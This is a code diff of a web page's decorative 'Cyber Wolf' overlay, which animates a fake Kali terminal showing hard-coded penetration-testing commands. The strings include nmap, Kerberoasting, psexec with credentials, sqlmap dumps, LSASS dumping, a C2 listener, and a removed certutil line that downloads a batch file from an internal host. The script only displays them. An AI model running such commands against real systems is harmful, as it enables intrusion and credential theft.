@@ -1411,9 +1411,10 @@
     });
   }
 </script>
+  // --- FIN LIGHTSABER CURSOR SCRIPT ---
 
+  // --- CYBERWOLF SCRIPT ---  
 <div id="cyber-wolf-ops">
-  <!-- Terminal Izquierda -->
   <div class="side-terminal left" id="term-left">
     <div class="term-header">
       <span class="term-title">root@kali:~</span>
@@ -1425,9 +1426,8 @@
     </div>
   </div>
 
-  <!-- Panel Central con Lobo -->
   <div class="wolf-center">
-    <svg id="wolf-svg" viewBox="0 0 360 360" width="200" height="200">
+    <svg id="wolf-svg" viewBox="0 0 360 360" width="180" height="180">
       <defs>
         <linearGradient id="wolfDark" x1="0%" y1="0%" x2="100%" y2="100%">
           <stop offset="0%" stop-color="#0a0f1a"/><stop offset="30%" stop-color="#151c2c"/><stop offset="60%" stop-color="#1e293b"/><stop offset="100%" stop-color="#050810"/>
@@ -1514,7 +1514,7 @@
     </svg>
 
     <div class="wolf-log">
-      <div class="log-header"><span class="dot"></span> OPERATIONS FEED</div>
+      <div class="log-header"><span class="dot"></span> OPERATIONS</div>
       <div class="log-content" id="log-out"></div>
     </div>
   </div>
@@ -1525,46 +1525,45 @@
 
 <style>
 :root{--cyber:#00f0ff;--cyber2:#00b4d8;--warn:#ff003c;--ok:#bfff00;--hack:#00ff41;--bg:rgba(5,8,15,.96);--border:#1a2234;--text:#e2e8f0;--text2:#64748b;--mono:'JetBrains Mono','Courier New',monospace}
-#cyber-wolf-ops{position:fixed;bottom:20px;left:20px;right:20px;z-index:99999;display:grid;grid-template-columns:320px 1fr;gap:15px;align-items:flex-end;cursor:pointer;user-select:none;font-family:var(--mono);opacity:0;transform:translateY(10px);transition:opacity .4s,transform .4s}
-.side-terminal{min-height:340px;background:rgba(3,6,12,.97);border:1px solid var(--border);border-radius:10px;overflow:hidden;backdrop-filter:blur(14px);box-shadow:0 8px 28px rgba(0,0,0,.65);display:flex;flex-direction:column}
-.term-header{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;background:rgba(10,16,28,.95);border-bottom:1px solid var(--border)}
-.term-title{font-size:9px;color:var(--cyber);font-weight:700;letter-spacing:.5px}
-.term-status{width:6px;height:6px;background:var(--ok);border-radius:50%;animation:pulse 1.5s infinite}
-.term-content{flex:1;padding:8px 10px;overflow:hidden;display:flex;flex-direction:column;gap:3px;font-size:8.5px;line-height:1.35;color:var(--text2)}
-.term-content .line{opacity:0;transform:translateX(-5px);transition:all .12s ease}
+#cyber-wolf-ops{position:fixed;bottom:80px;right:15px;z-index:99999;display:flex;flex-direction:column;gap:10px;cursor:pointer;user-select:none;font-family:var(--mono);opacity:0;transform:translateX(20px);transition:opacity .4s,transform .4s;width:340px}
+.side-terminal{min-height:280px;background:rgba(3,6,12,.95);border:1px solid var(--border);border-radius:8px;overflow:hidden;backdrop-filter:blur(14px);box-shadow:0 8px 28px rgba(0,0,0,.65);display:flex;flex-direction:column}
+.term-header{display:flex;justify-content:space-between;align-items:center;padding:6px 10px;background:linear-gradient(90deg,rgba(0,240,255,.15),rgba(0,180,216,.1));border-bottom:1px solid var(--border)}
+.term-title{font-size:8px;color:var(--cyber);font-weight:700;letter-spacing:.6px;text-transform:uppercase}
+.term-status{width:5px;height:5px;background:var(--ok);border-radius:50%;animation:pulse 1.5s infinite;box-shadow:0 0 8px var(--ok)}
+.term-content{flex:1;padding:6px 8px;overflow:hidden;display:flex;flex-direction:column;gap:2px;font-size:8px;line-height:1.35;color:var(--text2)}
+.term-content .line{opacity:0;transform:translateX(-4px);transition:all .1s ease}
 .term-content .line.show{opacity:1;transform:translateX(0)}
-.term-content .cmd{color:var(--cyber2);font-weight:500;word-break:break-all}
-.term-content .out{color:var(--text2);padding-left:12px}
-.term-content .warn{color:var(--warn)}
-.term-content .ok{color:var(--ok)}
-.term-cursor{padding:6px 10px;border-top:1px solid var(--border);font-size:9px;display:flex;align-items:center}
-.prompt{color:var(--ok);margin-right:4px;font-weight:600}
+.term-content .cmd{color:var(--cyber2);font-weight:500;word-break:break-all;font-size:7.5px}
+.term-content .out{color:var(--text2);padding-left:10px;font-size:7.5px}
+.term-content .warn{color:var(--warn);font-weight:600}
+.term-content .ok{color:var(--ok);font-weight:600}
+.term-cursor{padding:5px 8px;border-top:1px solid var(--border);font-size:8px;display:flex;align-items:center;background:rgba(0,240,255,.03)}
+.prompt{color:var(--ok);margin-right:3px;font-weight:600}
 .blink{animation:blink 1s step-end infinite;color:var(--cyber)}
 @keyframes blink{50%{opacity:0}}
-@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 5px var(--cyber)}50%{opacity:.25;box-shadow:none}}
-.wolf-center{display:flex;flex-direction:column;gap:10px;align-items:center}
+@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 8px var(--ok)}50%{opacity:.3;box-shadow:none}}
+.wolf-center{display:flex;flex-direction:column;gap:8px;align-items:center;background:rgba(8,12,20,.93);border:1px solid var(--border);border-radius:8px;padding:10px;backdrop-filter:blur(12px);box-shadow:0 6px 20px rgba(0,0,0,.5)}
 #wolf-svg{transition:filter .3s,transform .3s;display:block}
-#cyber-wolf-ops:hover #wolf-svg{transform:scale(1.04)}
-#cyber-wolf-ops.active #wolf-svg{filter:drop-shadow(0 0 12px var(--cyber))}
+#cyber-wolf-ops:hover #wolf-svg{transform:scale(1.05)}
+#cyber-wolf-ops.active #wolf-svg{filter:drop-shadow(0 0 10px var(--cyber))}
 #cyber-wolf-ops.focus #wolf-svg{filter:drop-shadow(0 0 10px var(--warn));animation:pulseWarn 1.2s infinite}
-@keyframes pulseWarn{0%,100%{filter:drop-shadow(0 0 10px var(--warn))}50%{filter:drop-shadow(0 0 18px var(--warn))}}
+@keyframes pulseWarn{0%,100%{filter:drop-shadow(0 0 10px var(--warn))}50%{filter:drop-shadow(0 0 16px var(--warn))}}
 #wolf-lidL,#wolf-lidR{transition:opacity .12s}
-.wolf-log{width:100%;max-width:440px;background:var(--bg);border:1px solid var(--border);border-radius:10px;overflow:hidden;backdrop-filter:blur(16px);box-shadow:0 8px 26px rgba(0,0,0,.6)}
-.log-header{display:flex;align-items:center;gap:6px;padding:7px 11px;font-size:8px;color:var(--text2);letter-spacing:.9px;border-bottom:1px solid var(--border)}
-.log-header .dot{width:4px;height:4px;background:var(--cyber);border-radius:50%;animation:pulse 1.6s infinite}
-.log-content{height:66px;padding:7px 11px;color:var(--text);font-size:9px;line-height:1.4;overflow:hidden;display:flex;flex-direction:column;justify-content:flex-end}
-.log-content div{opacity:0;transform:translateY(3px);transition:all .14s ease}
+.wolf-log{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:6px;overflow:hidden;backdrop-filter:blur(12px)}
+.log-header{display:flex;align-items:center;gap:5px;padding:5px 8px;font-size:7px;color:var(--text2);letter-spacing:.8px;border-bottom:1px solid var(--border);background:linear-gradient(90deg,rgba(0,240,255,.08),transparent)}
+.log-header .dot{width:3px;height:3px;background:var(--cyber);border-radius:50%;animation:pulse 1.6s infinite}
+.log-content{height:55px;padding:6px 8px;color:var(--text);font-size:8px;line-height:1.35;overflow:hidden;display:flex;flex-direction:column;justify-content:flex-end}
+.log-content div{opacity:0;transform:translateY(2px);transition:all .12s ease}
 .log-content div.show{opacity:1;transform:translateY(0)}
 .cmd{color:var(--cyber2);font-weight:500}.out{color:var(--text2)}.warn{color:var(--warn);font-weight:600}.ok{color:var(--ok);font-weight:600}.info{color:#60a5fa}
-#toast-container{position:fixed;bottom:115px;right:24px;z-index:100000;display:flex;flex-direction:column;gap:5px;pointer-events:none}
-.toast{background:var(--bg);border-left:2px solid var(--cyber);color:var(--text);padding:8px 12px;border-radius:6px;box-shadow:0 6px 20px rgba(0,0,0,.5);transform:translateX(160%);transition:transform .28s cubic-bezier(.4,0,.2,1);font-size:9px;max-width:290px;line-height:1.4;border:1px solid var(--border);backdrop-filter:blur(10px)}
+#toast-container{position:fixed;top:80px;right:15px;z-index:100000;display:flex;flex-direction:column;gap:4px;pointer-events:none;max-width:280px}
+.toast{background:var(--bg);border-left:2px solid var(--cyber);color:var(--text);padding:6px 10px;border-radius:6px;box-shadow:0 4px 16px rgba(0,0,0,.5);transform:translateX(140%);transition:transform .25s cubic-bezier(.4,0,.2,1);font-size:8px;line-height:1.3;border:1px solid var(--border);backdrop-filter:blur(10px)}
 .toast.show{transform:translateX(0)}
 .toast.ok{border-color:var(--ok)}.toast.warn{border-color:var(--warn)}.toast.info{border-color:#60a5fa}
-.toast .t-title{font-weight:700;display:block;margin-bottom:2px}
-.toast .t-desc{color:var(--text2);font-size:8.5px;opacity:.9;display:block}
-@media(max-width:1200px){#cyber-wolf-ops{grid-template-columns:280px 1fr;gap:12px;bottom:15px;left:15px;right:15px}.side-terminal{min-height:280px}}
-@media(max-width:900px){#cyber-wolf-ops{grid-template-columns:1fr;gap:10px;bottom:12px;left:12px;right:12px}.side-terminal{min-height:160px;order:2}.wolf-center{order:1}.wolf-log{max-width:100%;order:3}}
-@media(max-width:640px){#cyber-wolf-ops{bottom:10px;left:10px;right:10px}.side-terminal{min-height:140px}#wolf-svg{width:140px;height:140px}.wolf-log{max-width:100%}.log-content{height:54px;font-size:8px}#toast-container{right:12px;bottom:86px;max-width:220px}.toast{max-width:220px}}
+.toast .t-title{font-weight:700;display:block;margin-bottom:1px;font-size:8.5px}
+.toast .t-desc{color:var(--text2);font-size:7.5px;opacity:.9;display:block}
+@media(max-width:1024px){#cyber-wolf-ops{width:300px;bottom:75px;right:12px}.side-terminal{min-height:240px}}
+@media(max-width:768px){#cyber-wolf-ops{display:none}}
 </style>
 
 <script>
@@ -1583,14 +1582,14 @@
   function resize(){canvas.width=innerWidth;canvas.height=innerHeight;}
   resize();window.addEventListener('resize',resize);
 
-  const pts=Array.from({length:40},()=>({x:Math.random()*canvas.width,y:Math.random()*canvas.height,r:Math.random()*1.3+.3,sx:(Math.random()-.5)*.35,sy:(Math.random()-.5)*.35,a:Math.random()*.4}));
+  const pts=Array.from({length:35},()=>({x:Math.random()*canvas.width,y:Math.random()*canvas.height,r:Math.random()*1.2+.3,sx:(Math.random()-.5)*.3,sy:(Math.random()-.5)*.3,a:Math.random()*.4}));
   function drawPts(){
     ctx.clearRect(0,0,canvas.width,canvas.height);
     pts.forEach(p=>{
-      p.x+=p.sx;p.y+=p.sy;p.a+=.012;
+      p.x+=p.sx;p.y+=p.sy;p.a+=.01;
       if(p.x<0||p.x>canvas.width)p.sx*=-1;if(p.y<0||p.y>canvas.height)p.sy*=-1;
       ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
-      ctx.fillStyle=`rgba(0,240,255,${Math.abs(Math.sin(p.a))*.6})`;ctx.fill();
+      ctx.fillStyle=`rgba(0,240,255,${Math.abs(Math.sin(p.a))*.5})`;ctx.fill();
     });
     requestAnimationFrame(drawPts);
   }
@@ -1602,8 +1601,8 @@
   document.addEventListener('mousemove',e=>{tx=e.clientX;ty=e.clientY;});
   (function track(){
     const r=svg.getBoundingClientRect(),sx=r.left+r.width/2,sy=r.top+r.height/2;
-    cx+=(tx-cx)*0.038;cy+=(ty-cy)*0.038;
-    const dx=Math.min(4.5,Math.max(-4.5,(cx-sx)/48)),dy=Math.min(4.5,Math.max(-4.5,(cy-sy)/48));
+    cx+=(tx-cx)*0.04;cy+=(ty-cy)*0.04;
+    const dx=Math.min(4,Math.max(-4,(cx-sx)/45)),dy=Math.min(4,Math.max(-4,(cy-sy)/45));
     pL.setAttribute('transform',`translate(${dx},${dy})`);
     pR.setAttribute('transform',`translate(${dx},${dy})`);
     requestAnimationFrame(track);
@@ -1614,7 +1613,7 @@
     d.className=`line ${type}`;d.innerHTML=html;
     term.appendChild(d);
     requestAnimationFrame(()=>d.classList.add('show'));
-    if(term.children.length>14)term.removeChild(term.firstChild);
+    if(term.children.length>12)term.removeChild(term.firstChild);
   }
 
   function toast(title,desc,type='info'){
@@ -1623,29 +1622,25 @@
     t.innerHTML=`<span class="t-title">${title}</span><span class="t-desc">${desc}</span>`;
     toastC.appendChild(t);
     requestAnimationFrame(()=>t.classList.add('show'));
-    setTimeout(()=>{t.classList.remove('show');setTimeout(()=>t.remove(),320);},3600);
+    setTimeout(()=>{t.classList.remove('show');setTimeout(()=>t.remove(),300);},3500);
   }
 
   function logLine(html,type='out'){
     const d=document.createElement('div');
     d.className=type;d.innerHTML=`<span style="color:#475569">[${new Date().toLocaleTimeString('en-GB')}]</span> ${html}`;
     log.appendChild(d);requestAnimationFrame(()=>d.classList.add('show'));
-    if(log.children.length>5)log.removeChild(log.firstChild);
+    if(log.children.length>4)log.removeChild(log.firstChild);
   }
 
   const operations=[
-    {name:"NET_RECON",cmd:"nmap -sS -sV -sC -p- --min-rate 5000 -oA scans/dc01_full 10.12.0.0/24",left:["[+] Starting Nmap 7.94 at 2025-01-15 14:23 UTC","[*] Scanning 254 hosts on 65535 ports","[+] Discovered open ports: 53,88,389,445,636,3389/tcp","[*] OS detection: Windows Server 2022 Build 20348"],out:"[+] Scanning 254 hosts...\n[*] Open: 53,88,389,445,636,3389/tcp\n[+] Fingerprint: Windows Server 2022 (DC01.corp.local)",toast:{title:"HOST DISCOVERY",desc:"14 alive | DC01.corp.local [WinSrv2022]",type:"info"}},
-    {name:"AD_ENUM",cmd:"bloodhound-python -c All -d corp.local -ns 10.12.0.10 --zip -dc DC01 --collect-all",left:["[+] Connecting to LDAP server 10.12.0.10:389","[*] Collecting users, groups, computers, sessions","[+] Analyzing ACLs and permissions","[*] Computing shortest paths to Domain Admins"],out:"[+] Collecting AD data...\n[*] Users: 1,842 | Groups: 312 | Computers: 89\n[+] Shortest path to DA: 3 hops | Unconstrained Delegation on WSUS01",toast:{title:"AD ENUMERATION",desc:"Graph ingested | 3 paths to DA",type:"ok"}},
-    {name:"KERB_ATTACK",cmd:"impacket-GetUserSPNs -dc-ip 10.12.0.10 corp.local/svc_backup -request -outputfile hashes.kerb",left:["[+] Requesting TGS for service principal: svc_backup","[*] Hash captured: $krb5tgs$23$*svc_backup$CORP.LOCAL$...","[+] Sending to hashcat -m 13100 -a 0 hashes.kerb /usr/share/wordlists/rockyou.txt","[*] Password cracked: Summer2024!"],out:"[+] Requesting TGS...\n[*] Hash captured: $krb5tgs$23$*svc_backup$CORP.LOCAL$... [hashcat -m 13100]",toast:{title:"KERBEROASTING",desc:"TGS exported | svc_backup cracked",type:"warn"}},
-    {name:"LATERAL",cmd:"proxychains -q psexec.py corp.local/svc_backup:'P@ssw0rd!2024'@10.12.0.14 -codec UTF-8",left:["[!] Establishing SMB connection to 10.12.0.14:445","[*] Authenticating with svc_backup:P@ssw0rd!2024","[+] Uploading payload.exe to C:\\Windows\\Temp\\payload.exe","[*] Installing service: UpdateService","[+] Remote shell obtained as NT AUTHORITY\\SYSTEM"],out:"[!] SMB session to WSUS01 (10.12.0.14)...\n[*] Uploading payload.exe to C:\\Windows\\Temp\\\n[+] Remote shell obtained as NT AUTHORITY\\SYSTEM",toast:{title:"LATERAL MOVEMENT",desc:"WSUS01 compromised | SYSTEM shell",type:"warn"}},
-    {name:"PRIV_ESC",cmd:"whoami /priv | findstr SeImpersonate && certutil -urlcache -split -f http://10.12.0.50/rogue.bat C:\\Windows\\Temp\\rogue.bat",left:["[*] Checking current privileges...","[+] SeImpersonatePrivilege enabled","[*] Exploiting JuicyPotato/PrintSpoofer","[+] Token duplicated: DA privileges obtained","[*] Dumping LSASS with procdump64.exe -ma lsass.exe lsass.dmp"],out:"[*] Token manipulation via Named Pipe...\n[+] Privilege escalation successful: DA SID injection\n[*] Dumping LSASS with procdump64.exe",toast:{title:"PRIVILEGE ESCALATION",desc:"LSASS dumped | DA credentials extracted",type:"warn"}},
-    {name:"WEB_VULN",cmd:"ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u https://api.target.io/FUZZ -mc 200,401,403 -t 100",left:["[+] Fuzzing with 10,000 words [Rate: 2,400 req/s]","[*] 200: /v1/users/admin [Size: 1842]","[!] IDOR vulnerability detected: user_id parameter","[*] 403 bypass via X-Forwarded-For: 127.0.0.1","[+] /v1/admin/users accessible with spoofed IP"],out:"[+] Fuzzing endpoints... [Rate: 2.4k req/s]\n[*] 200: /v1/users/admin [IDOR]\n[*] 403 bypass via X-Forwarded-For: 127.0.0.1",toast:{title:"WEB VULNERABILITY",desc:"IDOR & 403 bypass | CVSS 8.4",type:"warn"}},
-    {name:"DB_EXFIL",cmd:"sqlmap -u 'https://api.target.io/search?q=1' --risk=3 --level=5 --batch --output-dir=/tmp/sqlmap --dump -T users",left:["[*] Testing boolean-based blind SQL injection","[+] DBMS: PostgreSQL 14.2 (Debian)","[*] Dumping table: public.users (4,281 rows)","[+] Exported to CSV: /tmp/sqlmap/corp.local/users.csv","[*] Columns: id, username, email, password_hash, role"],out:"[*] Testing blind boolean SQLi...\n[+] DBMS: PostgreSQL 14.2\n[*] Table 'users' -> 4,281 rows exported",toast:{title:"SQL INJECTION",desc:"PostgreSQL 14.2 | 4,281 rows",type:"warn"}},
-    {name:"CLOUD_ENUM",cmd:"az ad sp list --query '[?appDisplayName.contains(\"Prod\")]' | jq '.[] | {id,appId,displayName,roleAssignments:(.assignedTo | length)}'",left:["[+] Querying Microsoft Graph API","[*] Service principals found: 47","[!] prod-storage-mi: Storage Blob Data Contributor","[*] Role assignments: 12 | Overprivileged identity","[+] Permissions: Microsoft.Storage/storageAccounts/blobServices/containers/*"],out:"[+] Querying Entra ID...\n[*] Found: prod-storage-mi (Storage Blob Data Contributor)\n[!] Overprivileged Managed Identity",toast:{title:"CLOUD ENUMERATION",desc:"Overprivileged MI | Azure Blob",type:"info"}},
-    {name:"C2_BEACON",cmd:"sudo ./c2_server --port 443 --bind 0.0.0.0 --profile malleable_c2.txt --encryption AES-256-GCM --jitter 20",left:["[*] Loading malleable C2 profile: malleable_c2.txt","[+] Listener started on 0.0.0.0:443 (HTTPS)","[*] Waiting for beacon check-in...","[+] Beacon received: WIN-SRV01 (10.12.0.14)","[*] Sleep: 60s | Jitter: 20% | Encryption: AES-256-GCM","[+] Staging payload via reflective DLL injection"],out:"[*] C2 listener on 0.0.0.0:443 (HTTPS)\n[+] Beacon checked in: WIN-SRV01 | Sleep: 60s | Jitter: 20%\n[*] Staging via reflective DLL injection",toast:{title:"C2 ESTABLISHED",desc:"Beacon online | WIN-SRV01 | AES-256",type:"ok"}},
-    {name:"LOG_ANALYSIS",cmd:"cat /var/log/suricata/eve.json | jq -r '.alert.signature' | sort | uniq -c | sort -nr | head -20",left:["[+] Parsing Suricata EVE JSON logs","[*] Top alerts: ET SCAN Nmap (412 occurrences)","[!] ET POLICY C2 beacon detected (18 alerts)","[*] JA3 fingerprint match: suspicious TLS client (7 alerts)","[+] Correlating with Sigma rule: SIG-4821 (Lateral Movement)"],out:"[+] Parsing Suricata EVE JSON...\n[*] Top: ET SCAN Nmap (412), ET POLICY C2 (18), JA3 Match (7)\n[!] Correlating with Sigma rule SIG-4821",toast:{title:"THREAT HUNTING",desc:"Suricata parsed | 412 scan alerts",type:"info"}},
-    {name:"FORENSICS",cmd:"volatility3 -f memdump.raw windows.pslist --output-table -q | grep -iE 'mimikatz|procdump|lsass'",left:["[+] Loading memory dump: memdump.raw (8.2 GB)","[*] Analyzing process list with volatility3","[!] PID 4822: mimikatz.exe (x64) - User: CORP\\admin","[*] PID 1104: Procdump64.exe -ma lsass.exe lsass.dmp","[+] Suspicious activity detected: credential dumping"],out:"[+] Loading memory image...\n[*] PID 4822: mimikatz.exe (x64)\n[*] PID 1104: Procdump64.exe -ma lsass.exe",toast:{title:"MEMORY FORENSICS",desc:"Suspicious binaries in RAM dump",type:"warn"}},
-    {name:"REPORT",cmd:"pandoc findings.md -o report_$(date +%Y%m%d).pdf --template=cybersec -V geometry:margin=1in -V colorlinks=true",left:["[+] Compiling markdown to PDF with pandoc","[*] Sections: Executive Summary, Technical Findings, IOCs","[+] ATT&CK mapping included (12 techniques)","[*] SHA256 checksum: a3f2b8c1d4e5f6789abc...9c1b","[+] Report exported: report_20250115.pdf (2.4 MB)"],out:"[+] Compiling final report...\n[*] Sections: Executive, Technical, IOCs, ATT&CK Mapping\n[+] Exported: report_2025.pdf | SHA256 verified",toast:{title:"REPORT GENERATED",desc:"PDF compiled | SHA256 verified",type:"ok"}}
+    {name:"NET_RECON",cmd:"nmap -sS -sV -p- --min-rate 5000 10.12.0.0/24",left:["[+] Starting Nmap 7.94","[*] Scanning 254 hosts","[+] Open: 53,88,389,445,636","[*] OS: Windows Server 2022"],out:"[+] Scanning 254 hosts...\n[*] Open: 53,88,389,445,636\n[+] Fingerprint: DC01.corp.local",toast:{title:"HOST DISCOVERY",desc:"14 alive | DC01.corp.local",type:"info"}},
+    {name:"AD_ENUM",cmd:"bloodhound-python -c All -d corp.local",left:["[+] LDAP server connected","[*] Users: 1,842 | Groups: 312","[+] Paths to DA: 3 hops","[*] Unconstrained delegation"],out:"[+] Collecting AD data...\n[*] Users: 1,842 | Groups: 312\n[+] Path to DA: 3 hops",toast:{title:"AD ENUMERATION",desc:"Graph ingested | 3 paths",type:"ok"}},
+    {name:"KERB_ATTACK",cmd:"impacket-GetUserSPNs -request",left:["[+] TGS requested","[*] Hash: $krb5tgs$23$...","[+] Cracked: Summer2024!","[*] Testing credentials..."],out:"[+] Requesting TGS...\n[*] Hash captured\n[+] Password: Summer2024!",toast:{title:"KERBEROASTING",desc:"svc_backup cracked",type:"warn"}},
+    {name:"LATERAL",cmd:"proxychains psexec.py @10.12.0.14",left:["[!] SMB to 10.12.0.14:445","[*] Auth: svc_backup","[+] Shell: NT AUTHORITY\\SYSTEM","[*] Hostname: WSUS01"],out:"[!] SMB session established\n[+] Remote shell: SYSTEM\n[*] WSUS01 compromised",toast:{title:"LATERAL MOVEMENT",desc:"WSUS01 | SYSTEM",type:"warn"}},
+    {name:"WEB_VULN",cmd:"sqlmap -u 'search?q=1' --risk=3",left:["[*] Testing SQLi blind","[+] DBMS: PostgreSQL 14.2","[*] Table: users (4,281)","[+] Exported: users.csv"],out:"[*] Blind SQLi confirmed\n[+] PostgreSQL 14.2\n[*] 4,281 rows dumped",toast:{title:"SQL INJECTION",desc:"PostgreSQL | 4.2k rows",type:"warn"}},
+    {name:"CLOUD_ENUM",cmd:"az ad sp list --query Prod",left:["[+] Graph API query","[*] Principals: 47","[!] Overprivileged MI","[*] Storage Blob Contributor"],out:"[+] Entra ID queried\n[*] prod-storage-mi\n[!] Overprivileged identity",toast:{title:"CLOUD ENUM",desc:"Azure MI overprivileged",type:"info"}},
+    {name:"C2_BEACON",cmd:"./c2_server --port 443",left:["[*] C2 listener: 0.0.0.0:443","[+] Beacon: WIN-SRV01","[*] Sleep: 60s | Jitter: 20%","[+] AES-256-GCM active"],out:"[*] C2 on 0.0.0.0:443\n[+] WIN-SRV01 online\n[*] Encrypted: AES-256",toast:{title:"C2 ESTABLISHED",desc:"Beacon online",type:"ok"}},
+    {name:"REPORT",cmd:"pandoc findings.md -o report.pdf",left:["[+] Compiling PDF","[*] Sections: 12","[+] ATT&CK: 12 techniques","[✓] SHA256 verified"],out:"[+] Report compiled\n[*] PDF: 2.4MB\n[✓] Hash verified",toast:{title:"REPORT DONE",desc:"PDF exported",type:"ok"}}
   ];
 
   let opIdx=0;
@@ -1655,48 +1650,47 @@
     currentOp=op;
     opIdx++;opCounter++;
     
-    const spd=turbo?1.6:1;
+    const spd=turbo?1.5:1;
     
     sideLog(termLeft,`<span class="prompt">root@kali:~#</span> <span class="cmd">${op.cmd}</span>`,'cmd');
-    await new Promise(r=>setTimeout(r,180/spd));
+    await new Promise(r=>setTimeout(r,150/spd));
     
     for(const line of op.left){
       const type=line.includes('[!]')?'warn':line.includes('[+]')?'ok':'out';
       sideLog(termLeft,`<span class="${type}">${line}</span>`,type);
-      await new Promise(r=>setTimeout(r,140/spd));
+      await new Promise(r=>setTimeout(r,120/spd));
     }
     
-    logLine(`<span class="cmd">root@kali:~$ ${op.cmd}</span>`);
-    await new Promise(r=>setTimeout(r,220/spd));
+    logLine(`<span class="cmd">${op.cmd}</span>`);
+    await new Promise(r=>setTimeout(r,180/spd));
     logLine(`<span class="out">${op.out.replace(/\n/g,'<br>')}</span>`);
     
-    if(Math.random()<0.7){
+    if(Math.random()<0.65){
       toast(op.toast.title,op.toast.desc,op.toast.type);
     }
     
     if(opCounter%Math.floor(4+Math.random()*2)===0 && op.name!=='REPORT'){
       setTimeout(()=>{
-        toast('[!] IOC DETECTED','Lateral movement pattern | Sigma: T1021.002','warn');
+        toast('[!] IOC DETECTED','Lateral movement | Sigma: T1021.002','warn');
         core.classList.add('focus');
-        setTimeout(()=>core.classList.remove('focus'),1800);
-      },600);
+        setTimeout(()=>core.classList.remove('focus'),1600);
+      },500);
     }
     
     currentOp=null;
-    const nextDelay=Math.floor((550+Math.random()*850)/spd);
-    setTimeout(runOp,nextDelay);
+    setTimeout(runOp,Math.floor((500+Math.random()*700)/spd));
   }
 
   function start(){
     if(running)return;running=true;
     core.classList.add('active');
-    logLine(`<span class="info">[+] System online // Auto-scan enabled</span>`);
-    sideLog(termLeft,`<span class="ok">[+] Kali Linux 2024.4 initialized</span>`);
-    setTimeout(()=>toast('SYSTEM INITIALIZED','Operations started // Real-time monitoring','info'),300);
+    logLine(`<span class="info">[+] System online</span>`);
+    sideLog(termLeft,`<span class="ok">[+] Kali initialized</span>`);
+    setTimeout(()=>toast('SYSTEM READY','Monitoring active','info'),300);
     runOp();
   }
   start();
-  setInterval(()=>{if(!running)start();},7000);
+  setInterval(()=>{if(!running)start();},6000);
 
   core.addEventListener('click',()=>{
     if(turbo)return;turbo=true;
@@ -1705,22 +1699,22 @@
     setTimeout(()=>{
       lidL.style.opacity='0';lidR.style.opacity='0';
       pL.setAttribute('r','4');pR.setAttribute('r','4');
-    },260);
-    svg.style.transform='scale(1.08)';setTimeout(()=>svg.style.transform='',150);
-    toast('FOCUS MODE','Scan rate x1.6 // Priority targets engaged','ok');
-    sideLog(termLeft,`<span class="warn">[!] Turbo mode activated</span>`);
-    logLine(`<span class="warn">[!] Focus engaged // Turbo active</span>`);
+    },240);
+    svg.style.transform='scale(1.08)';setTimeout(()=>svg.style.transform='',140);
+    toast('FOCUS MODE','Turbo scan x1.5','ok');
+    sideLog(termLeft,`<span class="warn">[!] Turbo active</span>`);
+    logLine(`<span class="warn">[!] Focus engaged</span>`);
     clearTimeout(turboT);turboT=setTimeout(()=>{
       turbo=false;core.classList.remove('focus');
-      sideLog(termLeft,`<span class="info">[~] Normal speed resumed</span>`);
-      logLine(`<span class="info">[~] Normal speed resumed</span>`);
-    },2600);
+      sideLog(termLeft,`<span class="info">[~] Normal speed</span>`);
+      logLine(`<span class="info">[~] Resumed</span>`);
+    },2400);
   });
 
-  setTimeout(()=>{core.style.opacity='1';core.style.transform='translateY(0)';},80);
+  setTimeout(()=>{core.style.opacity='1';core.style.transform='translateX(0)';},100);
   window.addEventListener('beforeunload',()=>clearTimeout(turboT));
 })();
 </script>
-
+  
 </body>
 </html>
